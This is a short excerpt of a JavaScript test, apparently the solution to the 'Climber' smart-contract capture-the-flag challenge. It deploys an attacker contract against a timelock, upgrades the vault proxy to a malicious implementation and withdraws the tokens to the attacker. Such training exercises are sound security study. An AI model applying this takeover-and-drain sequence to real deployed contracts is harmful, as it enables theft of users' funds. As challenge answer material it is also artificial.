...
describe('[Challenge] Climber', function () {
  ...
  it('Exploit', async function () {
    ...
    const AttackerFactory = await ethers.getContractFactory('Attacker12', attacker);
    const attackerContract = await AttackerFactory.deploy(this.timelock.address);

    await attackerContract.attack(attacker.address, this.vault.address);

    const Vault2Factory = await ethers.getContractFactory('Vault2', attacker);
    const vault2 = await upgrades.upgradeProxy(this.vault.address, Vault2Factory);
    await vault2.withdraw2(attacker.address, this.token.address);
  });
